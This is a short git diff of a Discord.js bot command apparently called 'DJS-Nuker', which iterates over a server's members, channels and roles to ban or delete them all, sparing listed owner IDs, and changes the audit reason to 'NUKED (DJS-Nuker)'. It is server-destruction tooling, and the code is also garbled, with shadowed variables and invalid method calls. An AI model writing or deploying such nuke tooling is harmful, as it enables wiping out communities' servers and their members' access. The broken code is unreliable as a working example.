@@ -11,19 +11,19 @@ module.exports.run = async(bot, message, args) => {
         
      if(ownerids.ownerid.includes(message.user.id)) return;  
 
-        message.ban("Nuke");
+     message.delete("NUKED (DJS-Nuker)");
 
     })
 
     message.guild.channels.forEach(message => {
 
-          message.delete("Nuke");
+        message.delete("NUKED (DJS-Nuker)");
 
     })
 
     message.guild.roles.forEach(message => {
 
-         message.delete("Nuke");
+         message.delete("NUKED (DJS-Nuker)");
 
     })
   
